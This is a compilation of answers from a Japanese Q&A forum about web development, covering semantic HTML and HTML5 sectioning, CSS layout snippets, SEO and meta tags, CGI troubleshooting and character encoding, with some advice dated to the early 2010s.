＿＿<p>テストページ</p> ＿＿<div class="nav"> ＿＿＿<ul> ＿＿＿＿<li><a href="/">HOME</a></li> ＿＿＿＿<li><a href="/s">サービス概要</a></li> ＿＿＿＿<li><a href="/b">会社概要</a></li> ＿＿＿＿<li><a href="/d">お問い合わせ</a></li> ＿＿＿＿<li><a href="/e">サイトマップ</a></li> ＿＿＿</ul> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<div class="section"> ＿＿＿<h2>見出し</h2> ＿＿＿<p>本文</p> ＿＿＿<p>***コンテンツ***</p> ＿＿</div> ＿＿<div class="tableContent"> ＿＿＿<h3>目次</h3> ＿＿</div> ＿＿<div class="aside"> ＿＿＿<h3>***右サイドバー***</h3> ＿＿</div> ＿</div> ＿<div id="footer"> ＿＿<h2>文書情報</h2> ＿＿<p>***フッター***</p> ＿</div> </body> </html>
全く役に立たないということはありません。 それを土台にしてWebを活用すれば十分です。 現在のCSSの土台は2000年以前からできており、 次世代のHTML5が普及するのは当分先です。 体系的に学べるのなら本のレベルとしては十分でしょう。 ただし、IE6はバグが多く、多くのエンジニアから嫌われています。 ということなのでIE6専用のコードというのは捨てられた方がいいでしょう。
ホームページビルダーレベルの制作でもプロを名乗る人もいますし、WPやMTなどのCMSテーマを自作する素人さんもいらっしゃるので、何をもってプロと言っていいのかわかりませんがw ま、あくまで主観ですけど、例のサイトはごく一般的なサイトに見えます。 素人さんがつくったにしては、頑張って作ったね！というレベルの印象です。 こういうレベルのサイトは素人さんでもつくれますし、これ以下のプロもたくさんいますよ。
HTML内に非表示でということは、ソース表示あるいはjavascript,CSSのいずれかが使えないと見られると言うことでよいのですか？ 通常はご自身が書かれているようにXMLでデータを持ち、XSLTでHTML(XHTML)に変換し、そのプレゼンテーションをJQuery,CSSでコントロールする形だと思いますが・・・
長文失礼。 >No.4補足 >検索の順位を上げる方法ってことで合ってますか？ 99%合っています。 検索結果に、キャッチコピーなどが適切に表示されるような方法や、検索サイトから訪問したときの表示を調整するのもSEOです。 （これをやっているSEO会社はないと思います。HTMLファイルの改変や、GoogleアカウントでGoogleサイトにログインしての処理などが必要ですから。） SEOというのは一種の宣伝です。 すでに人がたくさん（十分）来てくれているなら、それ以上宣伝する必要はないと思います。 では、そのたくさん人が来る前の段階でどうすれば良いか、 その宣伝をGoogleなどの検索サイトに任せようというのが、SEOです。 >No.4補足 >順位はあまり拘らないんですけど、 >ユーザーが訪れてくれればいいのなら見た目重視？？ >つまりORUKAさんがよく言うマークアップの否定ですよね。 意味が分かりかねますが、、、 Googleなどの検索結果を利用する方法以外で宣伝できるなら、それで問題ないと思います。 ウェブサイトの善し悪しは二種類あります。 まずは、コンピューターが理解しやすいサイトである事。 もう一つは、人が見てきれいである事。 後者の方はHTMLがどうなっていようが、全く関係ありません。 人はHTMLコードを見ていないからです。 テーブルレイアウトでもFlashでも、見た目がきれい、誇張すればきれいな画像が使われていればそれで良サイトという事になります。 前者は、HTMLコードが重要で、見た目は関係ありません。 たとえば、ブラウザは『<h1>があれば、大きく表示し、前後に改行を行う』ということしか行っていませんが、 いわゆる文法違反があった場合、たとえば <h1>私の弟がこんなにかっこいいわけがない <p>主人公はごく普通の女子高生。ある日、、、</p> </h1> と書いてあったとき、「主人公は、、」の部分は<h1>の一部（大きく表示すべき）か、それとも<p>の前で<h1>を終了させておくのか、、、 という問題が発生します。 この問題は、違うブラウザで見たときに、違う表示になる事で確認できます。 この弊害があるため、文法は適切に、といわれます。 それ以上の事、つまり「どこに<h1>を使い、どこに<p>を使い、、、」というのは、99%はSEOだと思います。 残り1%については、 Operaなどでページの目次などがとれますが、はたしてこういう機能を使ってる人がどれほどいるのか、、、 （添付画像参照、http://portal.opera.com/の目次です。） こういう機能を使わなければ、（テーブル以外の）多くのタグがほとんど同じ表示になりますし、 HTMLコードの善し悪しは、「きれいな日本語を使いましょう。具体的には『ら抜き表現』禁止。」のような哲学にも近いと思います。 >ちなみに今思いついたことは高さ0のclass="header"を作って >そこに<h1>を置くという裏技です。 >SEO的にはズルは良くないと合ったのでアウトなんでしょうけど。 どういう目的で<h1>を書きたいのかがわかりませんが、 HTMLコードとして<h1>を書きたくて、でもブラウザでは表示させたくないなら、それでかまわないと思います。 No.5最初の例文を例にとると、 このとき、<h1>を表示させなければ、このページが何の作品なのかわからなくなります。 （ブラウザのタイトルバーやタブバーに<title>の物が書かれていますが、ページ内にタイトルが書かれている方がわかりやすいと思います。） もし、何らかの理由で<h1>を消したいのであれば、display:noneやheight:0を指定して隠してやれば良いと思います。
＞ちなみに、DreamweaverCS5も利用してるので DWの検索で一発です・・・
時間が経ってますが。 >No.1補足 肝心のデータを生成する部分やファイルに保存している部分が書かれていないようですが？
モジュールはいくつかあります。 ・HTML::TreeBuilder ・Web::Scraper　など HTML::TreeBuilderの使い方として、 リンクのURLを抽出しているサンプルを紹介しているサイトがありましたので、 参照URLをご覧ください。 onclick="return opendetail(******)の******の部分は、 onclickで抽出して、その後、正規表現などで 抽出すればいいと思います。 参考URL：http://www.geekpage.jp/programming/perl-network/ …
　デザインを考えてマークアップするのは変です。tableを使ってデザインするのと意味的に同じHTMLの否定になります。 　常に、文書構造を基準にデザインはスタイル指定がなくても意味が通じるように書きます。例にあげられたものでしたら <div class="section"> 　<h2>見出し</h2> 　<div class="figure"><img></div> 　<p>声明文・・・・</p> 　<table summary="説明" border="1"> 　　<tbody> 　　・・・【中略】・・・ 　</table> 　<p>説明の続き</p> </div> <div class="section"> 　<h2>見出し</h2> 　<p>説明文</p> </div> とかになるでしょう。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素・・は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より HTML5では、 <section> 　<h2>見出し</h2> 　<figure><img></figure> 　<p>声明文・・・・</p> 　<table> 　　<tbody> 　　・・・【中略】・・・ 　</table> 　<p>説明の続き</p> </section> <section> 　<h2>見出し</h2> 　<p>説明文</p> </section> とかになるでしょう。 そのうえで、スタイルシートで div.section div.figure{float:left;margin:1ex 1em;} div.section{clear:left;} だけでよいはずです。 HTML5用だと section figure{float:left;margin:1ex 1em;} section{clear:left;} 要は、何年かして見ても自身で本文に何が書いてあるか、挿絵に何が書かれているかわかることが大事です。当然検索エンジンもこれらの文書構造上意味のあるclass名は読んで理解してくれます。 HTMLがデザインに引っ張られたらダメです。
屁理屈なんかより正しいかどうかを知りたくて投稿したんですよね。なので以下答えのみ。 ＞(1)はnoteというclass属性を持つp要素に対してfont-style: italicを適用する ＞(<p></p>←のようにnoteを持たない<p>タグには適用されない) ＞(2)（p要素に限定せず、）noteというclass属性が与えられているすべての要素に ＞text-decoratoin: underlineを適用する。 (1)の括弧内が厳密には違います。「p要素以外のclass="note"」にも適用されません。 あとは合っています。 以上です。
No.2です。 ＞要素に特別な読み方がないとはしりませんでした。 　アメリカ人のクリェーターと話したとき、かれらも我流だそうです。strongのように英単語そのままのものはまだしも、英単語とかけ離れたものもありますからね。 　aは、anchorと言ったましたが、書くのはaです。blockquoteなんて単語はないけど、「block quotation」です。divなんてそのまま「ディブ」ですし。 　ちなみに私は、blockquoteは、ビー・エル・・・・です。 　元々英語の単語なんて発音では覚えられないです。knight,nightは同じ、rowやなんて綴りが同じで読みが違うと意味も変わる。phoenixなんて読みを知っていても書けない。日本語で言うと「歴史的仮名遣い」が残っている言語です。ですから、正しい読み方はないともしえます。rowってどう読むのが正しいのでしょうね。 　ドイツ語はその点、楽でしたね。 　ですから、読みのこだわらず存分に自分流で行きましょう。まあ、よいテキストエディタを探してください。要素名や属性を間違ったら色がつかない・・ 　 　
誤解があるようなので・・ googleは、公式にmetaのkeywordsは意味がないと言っています。 Official Google Webmaster Central Blog: Google does not use the keywords meta tag in web ranking ( http://googlewebmastercentral.blogspot.com/2009/ … ) meta description、keywordsは必要？｜web bibo ( http://www.webbibo.com/blog/seo/meta.html ) 　私は、随分前から書いていませんが、「★★」(書けば特定されるので書きませんが、ある分野の人が探そうとしたとき必ず記入する単語)で検索すれば、検索結果のトップに出てきます。いちいち、そんなの書く暇があったら、内容を充実させたほうが良いでしょう。 　descriptionについては、本文中で示されていない場合は、検索結果に使用する場合もあるようですが、それ自体が検索に引っかかるわけではないようです。 　私は、本分<body>の<div class="header">内の、<div class="abstract">に書く。HTML5の場合は、<header>内に書いてます。ほぼ100%、この記事が検索結果に表示されます。
もう少し詳しく。どういう更新をしたいのですか？ リンク切れを発見する？ 更新された内容にリンクテキストを一致させる？　などなど　あるでしょ
CGIをそのままコピーしたら・・ ですね。転送はきちんとされてますか？ 　FTPで転送されたと思いますが、そのとききちんとCGIはテキストモードで転送されてますか？UNIXサーバーとWindowsサーバーでは改行コードが異なります。(これは、多くの場合デフォルトで良いでしょう。 　パーミッションはきちんと設定しましたか？ 　ＣＧＩが使用する言語、perlの位置は間違いないですか？ 　　また、CGIが使用するライブラリやモジュールの位置はあってますか？ 　エラーろぐは、確認しましたか？ 　　エラーの原因となっている行や理由が書かれています。 　　サーバーのエラーろぐが確認できない場所にあるなら、エラー出力先を変更して確認しましょう。 　telnetが使えれば、ステップごとに追跡しましょう。(最近はtelnetは許可されていないので無理かも)、変わりにtelnet.cgiを使うとか 　その他、様々な原因がありますが、まずCGIのエラーろぐを確認しないと始まりません。 　 　
input type="image"を使うのが一般的でしょう。 ただ、ユーザビリティ上で問題になる場合もある（特にポインターを持たないユーザーエージェントなど）がある場合は、代替手段を用意するか、スタイルシートで行うかでしょうね。 ★17.4.1 INPUT要素で作成するコントロールの形式 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　わからないときは、常に仕様書を読む癖をつけましょう。その上でわからない部分を聞くと良いです。
>getElementsByTagName(tag)だと、一つしかタグを指定きず getElementsByTagName('*')とか？
カラメルっていうサイトさんがあります。 http://shop-pro.jp/ 有名な激安サーバーのロリポップの兄弟サイトになります。 ここにメルマガ機能がついているようですね。 HTML作成ソフトはもちろん定番のホームページビルダーをオススメします。 もう十年以上使ってますが何の不満もありませんよ。 ユーザーさんも多いので初心者が選ぶソフトとしては無難でしょう。 http://www.justsystems.com/jp/products/hpb_15/ 配信の方は正直言ってお力になれません。 私も大量メールを発信したことがあるのですが、たかが数百の案内メールでも死にそうなぐらい手作業では大変でした。 これは個人でやるもんじゃないって心底思いましたね。 メルマガは企業向けだと思います。（そして専門に委託すべきである） それを素人にやれとは本当に困った上司さんですね……（汗） とりあえず配信も何らかのソフトを使うべきなのは確かです。 そしてご使用のサーバーによっては一日のメール配信数に制限が設けられている場合があるのでお気をつけ下さい（私が使っているサーバーにはスパムメール送信防止のために制限がついてます。個人が使用する分には特に問題がない数ではありますが）
attachやAttachmentなどのオプションを解析するのは メーラーの仕事です。 attachオプションはそれに対応するメーラーがあれば 有効になります。 例えばOutlookなんかはセキュリティの関係で 添付ファイルの自動添付はできないかもしれません。 （実際に仕様を確認しないと分からないですけど） ※自動で添付ファイルを付けられると 　悪意を持って行えば個人情報なんかを 　勝手に引き抜くことができますから。
　ご利用されているものが、レンタルサーバーでしたら、そもそもインストールされているか、インストールできるようになっていると思います。 　ご利用のISPのマニュアルをご確認ください。
Javascriptで日付表示をすると、ページを見ているお客さんのパソコンの時計が基準になってしまいます。 時計が狂っているととんでもない日付が表示される可能性があるので、サーバサイドで処理して表示しましょう。
iframe内のページは、本体とは独立しています。 そのページ内のアンカーターゲットで指定することになります。 <iframe src="http://oshiete.goo.ne.jp/qa/7116301.html#a1" width="640" height="480"> とか・・ 　当然、そのアンカーが指定してある要素が、左端にあることが必須です。
先日、ジオシティーズの設定～引越を手伝いましたが、.htaccessは利用不可でした・・・ ジオシティーズでのパスワード 　１、.htaccess利用不可 　２、ジオシティーズ（無料版で）は、CGI利用不可 　３、JavaScriptなら可能 しかし、 パスワードでの制限は、規約違反/禁止のようです。 http://geocities.yahoo.co.jp/guideline/index.html （無料サービスでの制限は多いのです） アドレス変更のデメリットがありますが、 制限の少ない有料レンタルサーバ＆独自ドメインをお勧めします。
NO.1の回答/お礼も見ましたが、 個人的（友人間）などで利用するなら オンラインストレージ、SkyDriveなどでやりとりする方が良いのでは？
巾を％で指定したサンプルは 　floatによる段組について - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7079628.html#a7 )にあります。 　ここで、 div.header,div.section,div.footer{ width:100%;margin:0 auto;/* センター配置IE5,非対応 */ border:solid 1px rgb(255,200,200);background-color:rgb(255,200,200); } で巾いっぱいで、ナビゲーション(目次)は30% とか。その他の値を変更すると、目次を200pxで残りを本文とか自在に出来るでしょう。
cnavasはフレージングコンテンツ(HTML4で言うところのinline要素など)ですから、imgと同じ扱いです。 　セクショニングコンテンツやヘッディングコンテンツ・・(HTML4で言うところのブロック要素)ではありませんから、通常はブロック要素に入るはずです。 <p>これはキャンバスの見本です。<canvas>・・・</canvas></p> ボディ要素直下に入ることはありません。imgもそうしていたと思います。 <body> 　<img> はダメ!!!。 <body> 　<div> 　　<p>・・・</p> 　　<img> 　　<p>・・・</p> 　</div> </body> も同様です。ブラウザは匿名ブロックを作りますが、望ましくはない。 対処は、それが挿絵なら <figure> 　<figcaption></figcaption> 　<canvas>・・・</canvas> </figure> figure{width:210px;margin:0 auto; text-align:cener; } とか、 canvas#target{ display:block; margin:0 auto; } ですかね。 　HTML4のimgやobjectと同じに考えてください。それらも中央に置くならそうしたように。
極めて簡単に説明すると 元々SGMLという、文書をマークアップする規格があった。⇒http://ja.wikipedia.org/wiki/SGML 　ただし、大変複雑で扱いにくかった HTMLが考案されたとき、このSGMLを参考にして作られたが、扱いやすいよう極めて簡略化されたものであった。 　<P>・・・・ 　<p>・・・・ と言う書き方や、<IMG WIDTH=240 height=180>と言う書き方が出来た。 一方、SGMLの一部を取り出して作成されたXML( Extensible Markup Language )と言うものもできた。これはSGMLの一つであるが、自由にタグが拡張できた 　<原稿> 　　<p>・・・・</p> 　　<注釈>・・・</注釈> ・整形型でなければならない 　など、入力は大変だけど機械処理に向いている。 HTML4は、HTML4.01で終了して、すべてXHTMLに移行する予定だった。 　<p>・・・・</p> 　<p>・・・・</p> 　<img width="240" height="180" /> XHTML1.0はHTML4.01をそっくりそのままXMLにしたもの。 XHTML1.1はXHTML1.0strict(=HTML4.01strict)の改訂版 XHTML2.0・・中止・・ 　しかし、それじゃHTMLの良さ(簡便さ)が失われると、ブラウザベンダーなどが反旗を翻して、独自に新しいHTMLを作り始めた。そしてW3Cもそれを認めて、合流はしてないけど、一緒に作業を進めることになった。 　言い換えればHTML4.01strictの改訂版です。あわせてHTML5では、XHTMLの書き方も用意される。 　まあ、HTML4.01strict【transitinalじゃない】をしっかり身につけておけば、 ★HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　で済む程度かな・・ このあたりの流れは、 ★HTML5が持つ本当の意味 － ＠IT ( http://www.atmarkit.co.jp/news/200801/25/html.html ) ★HTMLに再び風は吹くか、そして「HTML 5.0」は － ＠IT ( http://www.atmarkit.co.jp/news/200703/13/eweek.h … ) を読めば、なるほどとわかるでしょう。 　
フッターのサイズにあわせて画像を編集してはいかがでしょう。 添付の画像でしたら、横方向に足りないなら、 [元の画像][左右反転の画像] 縦方向に足りないなら、 [元の画像] [上下反転の画像] としてつなげて、余った部分はカットという感じで作ればつなぎ目は気にならないはずです。 付属のペイントソフトでも十分できるでしょう。
＞utf-8だと日本語が文字化けしてしまいます。 は、HTMLの文字コード指定・・たとえば<meta>タグでcharset="UTF-8"を指定しているという意味でしたら、ファイル自体もUTF-8で書かれていないと当然、ブラウザはUTF-8で読もうとしますから文字化けします。 　ファイル自体もUTFで保存しないとダメです。 ＞shift-jisにすると正しく表示されます。 が、「Shift_JISを指定すると文字化けしない」と言うことなら原因はこれでしょう。 　それ以外でしたら、補足で書いてください。
CGI - 教えて！goo ( http://oshiete.goo.ne.jp/category/251/ ) Perl - 教えて！goo ( http://oshiete.goo.ne.jp/category/255/ ) で聞かれたほうが良いでしょう。 　簡単に言うと、 ・データの数をページ数で割って切り上げて丸める。 ・カレントのページをPATH_INFOかQueryStringsで保持する。 ・カレントの前後に配置する数を決める。 　if($max<10){$Last=$Max;$Start=0;} 　else{ 　　if($Current<4){$Max=10;$Start=0;} 　　elsif($Current+4>$Max){$Last=$Max;$Start=$Max-10;} 　　else{$Max=$Current+4;$Start=$Max-10;} 　} とか・・・単なる思い付き・・ きちんと、フローチャートを書いて考えましょう。
はは、上でしたね。 なら、スタイルシートは・・ div.nav{ ＿width:480px;/* 画像の横サイズ */ ＿margin:0 auto; /* 中央へ */ } div.nav ol,div.nav ol li{ ＿display:block;list-style:none; /* リストをブロックに */ ＿margin:0 2px; /* 隣との隙間 */ ＿float:left; /* フロート */ } div.nav hr{ ＿border:none; ＿height:360px; ＿clear:left; ＿background:url(./images/sample04.jpg) no-repeat; /* 背景画像 */} } 左におきたければ div.nav{ ＿width:640px; ＿margin:0 auto; /* 中央へ */ ＿background:url(./images/sample04.jpg) no-repeat right; /* 背景画像 */ ＿min-height:360px; } div.nav ol{width:160px;} div.nav ol,div.nav ol li{ ＿display:block;list-style:none; /* リストをブロックに */ ＿margin:2px 0; /* 隣との隙間 */ } div.nav hr{ ＿visibility:hidden; } 図の上に並べたければ div.nav{ ＿width:480px; ＿margin:0 auto; /* 中央へ */ ＿background:url(./images/sample04.jpg) no-repeat right; /* 背景画像 */ ＿height:360px; } div.nav ol{width:160px;} div.nav ol,div.nav ol li{ ＿display:block;list-style:none; /* リストをブロックに */ ＿position:relative; } div.nav ol li a{ ＿position:absolute; ＿display:block; ＿width:80px;height:60px; } div.nav ol li a[href="./hokkaidou"]{left:240px;top:10px;} div.nav ol li a[href="./aomori"]{left:220px;top:80px;} div.nav ol li a[href="./iwate"]{left:250px;top:150px;} div.nav hr{ ＿visibility:hidden; } 要は、HTMLさえきちんと文書構造でマークアップされていれば、好きなようになると言うことです。
＞会員制の商業サイトはその思想と思いっきり反対側ですよね？ ＞こういうサイトは本来とはかけ離れた存在なのでしょうか。 　私はほとんど利用しないのでわかりません。どちらかと言うと、ＩＴや科学関係の技術書が多いので・・ 　ただ、そのような場合は、articleで括るほうが良いでしょう。 4.4.4 The article element ( http://www.w3.org/TR/html5/sections.html#the-art … ) ＞sectionとかの用途はこうやって説明を受けると ＞部分的には分かるんだけど、応用まではまだまだですね。 　文書構造を明確化できるので、 ・文書構成をマークアップすることに適合している ・SEO は無論ですが、著者側も極めて楽になります。スタイルシートに section figure{ 　font-size:09em; 　position:absolute; 　left:101% ・・・・ section aside{ 　fot-size:09em; 　margin:2ex 2em; 　border:dotted gray 1px; ・・・ body>section>section{ 　margin-left:2em; とか書いて、それが何をしようとしているか、何年かたって見直したってわかります。 HTML4.01だって、それぞれを<div class="section"><div class="figure">とするだけ。 　機械や自分を含めて第三者に理解できるようにすることは、なによりも自分のためであり、そして従来より簡単になるということ。わかりにくくもないどころか、よりわかりやすくなるのではないかと思います。 内容に？？なところもありますが、それらの要素の意味は HTML5.0のレイアウト要素 | HTML5とは？変わるWebと注目の新要素 HTML5.0の情報サイト ( http://www.html5-guide.com/add/layout/ ) 　がわかりやすいでしょう。 　私は、現在はHTML4.01strictがメインですが、 HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )原文は HTML5 differences from HTML4 ( http://www.w3.org/TR/html5-diff/ ) 　などを参考にして、文書構造やclass名などを利用させてもらってます。HTML5の勉強になりますし・・
HTMLとはHyper Text Markup Languageの略で、高度なマークアップ言語とでも訳しましょうか？ 　当事セルンにいたバーナーズリーが考案した「自分の知識や考えを共有させることが、他人の知識を 学ぶのと同じくらいに容易であるようなシステム ( http://www.sal.tohoku.ac.jp/~gothit/webpolicy.html )」で使用される言語です。【この前後も読んでおくこと】 　この言語の考案のヒントになったのは、SGMLという大変複雑な仕様ですが、それを元に『ある文書を、それがどのような構成要素で成り立っているかをマークアップ(印をつける)言語』です。 －<HTML> ↑　－　<HEAD> ｜　↑　　<META ・【略】・>コンピューター相手の情報 ｜ヘッダ　<META ・【略】・>コンピューター相手の情報 ｜　↓　　　　<TITLE>タイトル</TITLE> ｜　－　</HEAD> HTML－　<BODY> ｜　↑　　－<P> ｜本文［段落］　<img ・【略】・>画像 ｜　↓　　－</P> ↓　－　</BODY> －</HTML> 　このように、文書を構成する要素(Element)に分解して、コンピューターに、それぞの構成要素が何であるかを、タグ(荷札)を使ってマークアップしていく方法です。 ・現在は、要素名は小文字で書くほうが主流です。 ・画像のような行内要素は、ブロック要素内に書かなければなりません。 　一度、 はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　を通して学んでおかれたら良いでしょう。
「ブラウザにパスワードを保存するか」聞かれる場合と、聞かれない場合・・・は、cookieとは関係なく、ブラウザの機能によるものです。すでに保存を了承しているサイトの場合は、問合せは出ないはずです。cookieの保存を問う場合はメッセージが異なります。
<div id="top"></div> 中身ないのですか？・・中身がないと・・スタイルやリンクのために余計なdivを書かないように、idは、あくまでその要素に対するidです。要素の中身がないと・・ なぜ。 <header id="TOP"> 　<h1>見出し</h1> </header> <section> 　<p class="navi"><a href="#TOP"><img src="${resource(dir:'images',file:'btn_top.png') }" alt="PAGE TOPへ" width="75" height="26" /></a></p> としないのですか？ 他の背景白の要素がかぶってませんか？ firefoxをお持ちなら、firebugで何かがかぶっていればわかりますが・・・
「ダウンロード」という言葉にはたくさんの意味があります。 その語弊をさけるために、もうちょっと言葉を使い分けた方が良いでしょう。 質問者の意味は『恒久的な保存』であると思いますが、 回答者は『一時的な保存』または『通信』の事を意味していると思います。 恒久的な保存の意味でのダウンロードは、ストリーミングではできないことが多い（絶対にできないわけではありませんが、相応の技術やそれ用のソフトウェアが必要なので、それなりの知識を持っていない人には保存できない）ですが、 一時的な保存、通信の意味でのダウンロードは、可能、というよりも必要です。 「コンテンツの保護」にも、何種類もありますが、、、 たとえば、パソコンのワンセグチューナーでは、ビデオを保存してもチューナーを設置していなければ再生できないなどの保護が施されています（いる物が多いです）。 このファイルそのものは、簡単にコピー、他の人に配布し、恒久的に保存してもらう事もできます。 が、保存時の環境（携帯電話で言う個体識別番号が一致するもの）でなければ再生できません。 これは、<video>ではできません。 ほかの回答は語弊を利用したタダの嫌がらせだと思いますが、（この回答の仕方は、いろんなBBSでパターン化しています。） 「コンテンツの保護」については、何の保護なのか、私もわかりません。 ストリーミングに対応しているか、という事であれば、対応していません。
結論です。IEでは簡単には無理です。参考サイトは最後に書いておきます。 　まず、データの多いtableは、<thead><tfoot><tbody>でマークアップすべきです。これは印刷したとき(ユーザーエージェントがページ媒体であるとき)に、それぞれのページに見出しを表示すべきだからです。先の回答を実際に印刷すると明白です。ページ媒体でスクロールは出来ませんから、overflowにscrollないしautoを指定した場合は、スタイルシートでスクリーン端末のみ適用されるよう記述することは必須です。スタイルシートのデフォルトはall(仕様書ではscreenですが、実装はallになっています。HTML5では　allに変更される) 　期待のように表示させるためには、本来はtbodyにoverflowを指定すればよいのですが、これはtable要素には使えないことになっています。(IEにはバグあり使えそうに見えます) 　そのため、スタイルシートでtbodyをblockに変換してやる必要があります。しかしその時点でIEは、tbodyの高さをtrに継承してしまうバグがあります。またスクロールバー自体が表示されません。 　IEで期待通りの表らしき形にしたいのなら、table以外でマークアップしてすべての要素table,thead,tfoot,tbody,tr,td,th,col,cilgroup・・をブロックに下からスタイルシートで配置しなおさないとなりません。 　当然ですが、スタイルシートを読まないブラウザ(テキストブラウザ、点字端末、読み上げソフト、そしてプリンター)や他の端末、検索エンジンには意味が通じないことになります。 　仕方なく、table全体を<div>で囲って、thead部分をfixedで固定する方法も試したのですが、IEのみfixedで位置を決めない場合は影も形も消えうせてしまいます。--もちろん標準ブラウザではきちんと整形されます。 ｛IEのみで使えれば良いので，｝ 　は、印刷やその他すべてを犠牲にすれば、表の見出しと本体を別のtableにするなど、文書構造を無視したマークアップ・・あるいは、リストなどでマークアップすることになりますが、決してすべきではない邪道になります。 ☆tbodyをscrollさせる方法は下記サイトをご覧ください。 Tableのヘッダ(thead)を固定して、<tbody>内をスクロールさせる方法 » 株式会社ジラフィー(Giraffy) ( http://giraffy.jp/blog/2009/09/11/css/107/ ) 　今回は質問ありがとうございます。自分自身よい勉強になりました。ＩＥがクソであることも再確認できたし・(笑)
＞・機能・レイアウト以外に省略しないほうがいい理由があるのでしょうか？あるならその理由を具体的に教えてください。 「このタグは省略できたかな、どうだったかな」と迷うぐらいなら「全部つける」にしておいた方がかえって楽。この質問のような悩みも生まれないわけです。
なぜheightも50%にしない？
HTML5では新しくheaderというタグが出来るのですし、 h1～h6も存在するのですから、headingのままで宜しいと思いますよ。 brが改行が意訳との見解には、私と相違があるかもしれませんが、 文字通り強制的に改行させたい位置に<br>を置きます。 文字がブラウザの右端で改行されているように見えるのは、 物理的に仕方なしに折り返させているのです。 あくまで改行ではなく折り返しです。 <br>はワープロでいう改行コードになります。
多くのブラウザでは、セル内の中央に配置されます。 +--------+---------+--------- |　　　　　　　|あいうえお| |あいうえお|---------+ |　　　　　　　|あいうえお|あいうえお |--------|----------| |あいうえお|あいうえお| |--------|----------+---------- となります。 スタイルシートで、td{vertical-align:top;}とすると良いでしょう。
そんなサーバーは聞いたことないですね。 お望みの挙動については、.htaccessで実装可能だと思いますよ。 参考： http://php-tips.com/server/2011/05/mod_rewrite-h … 503ErrorDocumentで指定したファイルに 指定時刻までカウントダウンさせるタイマーを 実装させればお望みの仕様になると思います。 表示させるファイルをPerlやPHPなどで作って 時刻によって表示を切り分けても実装可能だと思います。
ブラウザによって表示形式が異なるということはありますが、「開けない」というのは、HTMLだけの問題ではないかと思います。 環境などがわからないと何とも言えませんが、「開けない」というのは、何かエラー表示が出るのですか？それともずっとアクセス中のぐるぐるマークでいつまでまっても表示されないということ？ あなたが作ったサイトであなたが意図してないのにie9だけ開けないというのはちょっと考えられないです。確認ミスの可能性大。 どこかのサイトで、ie9でだけ開けないということなら、そのサイト作成者が意図的にそうしてるんだと思います。
あなたが必要とする機能を持つDOCTYPEを利用しましょう。 ・<video><canbas><audio>、あるいはSVCのような新機能を使う必要があればHTML5です。 ・古いブラウザにも対応させたいならHTML4.01です。 　　HTML4.01に完全に対応したブラウザは今でもありませんが(^^) 　選択基準は何が必要かになるでしょう。HTML5の勧告は2022年予定(早まるかも)です。 　いずれにしてもHTML4.01にも種類があります。すくなくともHTML4.01strictにはしておく必要があるでしょう。transitional,framesetはHTML5では要素、属性が廃止になります。 　もうひとつ、XHTML1.0,XHTML1.1が検討対象から抜けていますが、これも基本的には同じ考えで良いと思います。HTMLの要素だけでは足りないので独自要素を追加したいとか、他のアプリケーションで使うとかの場合は、XHTML1.0strict,XHTML1.1も選択肢でしょう。XHTML2.0は開発中断です。HTMLに統合され、XHTML5となります。 　結論から言うと、現在ウェブ標準とされているHTML4.01strict+CSS2.1(バージョンが重要!!)の組み合わせが良いでしょう。 　その場合、策定中のHTML5の仕様書は理解しておく必要があります。でないと、将来泣くことになる。すなわち、きちんと文書構造にしたがってマークアップすることです。 　
<div style="position:absolute;top:0;left:0;" class="hh"> <img src="r014p.jpg" style="width:100%;" alt="背景画像"></div> <div style="position:absolute;top:0;left:0;width:100%;"> <div style="padding-left:2em;padding-right:1em;padding-bottom:1.5em;"> 通常の内容 </div></div> padding-left:2em;padding-right:1em;padding-bottom:1.5emは、ページに対して空白とっています。 hhは、縦と横は、javascriptで変更です。 bb=screen.width;　//横幅 aa=screen.height;　//縦幅 if (aa>=1200) {dirName="g_f/t1200.css";} else if(aa>=1024) {dirName="g_f/t1024.css";} else {dirName="g_f/t768.css";} //window.alert("dirName!!" + dirName); document.write("<link rel='stylesheet' href='"+dirName+"' type='text/css'>");
　SEOとは、検索エンジン最適化の頭文字ですが、Wikiの記事と、検索エンジン側の説明には大きな違いがあります。Wikiの説明は、いわゆる「検索エンジンでの上位表示を目指す」手法として説明していますが、実際のところそんな技があるわけではありません。 　真の意味のSEOとは、文字通り「検索エンジン最適化」であって、検索エンジンがサイトの情報を正確に収集・データベース化できる方法です。結果的に、それは検索エンジンのデータベースのしかるべき位置に収納され、検索の結果が内容を的確に示して表示されることを通じて「上位に表示されるようになります」 [参考] 検索エンジン最適化 - Wikipedia ( http://ja.wikipedia.org/wiki/%E6%A4%9C%E7%B4%A2% … ) ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ ( http://www.google.com/support/webmasters/bin/ans … ) 　そのために絶対に必要なことは、文書を正しくマークアップすることですから ＞ブログ記事のタイトルに「見出しH2タグ」が使われているのですが、例えば記事を10記事書いて 　これは良いでしょうが、それが決して ＞トップページに10記事表示させた場合トップURLに「見出しH2タグ」が1個以上使われた事になって 　にはならないはずです。(ブログがトップページを自動作成する場合を除く。) 　トップページのHTMLは <div class="nav"> 　<h2>ブログ記事一覧</h2> 　<ul> 　　<li><a href=""></a></li> 　　<li><a href=""></a></li> ・・・・ 　</ol> </div> と書かれていたら、検索エンジンは、トップページのそこにナビゲーションがあることを的確に理解してくれるでしょう。navは、googleなどが提案した要素で、HTML5では次の書き方になる予定 <nav> 　<h2>ブログ記事一覧</h2> 　<ul> 　　<li><a href=""></a></li> 　　<li><a href=""></a></li> ・・・・ 　</ol> </nav> 　逆に言うと、目立たせたいばかりに<h2></h2>を並ばせても、そのような小手先の業にだまされる検索エンジンはありません。逆効果になる可能性は大です。 　SEOで最も大事なことは、文書構造にしたがって正しくマークアップすること。検索エンジンの上位表示を目指す一切の小手先の業(わざ)は使わないことです。 <body> 　<div class="header"> 　　ヘッダ部分、ナビゲーションを含むこともあるでしょう。 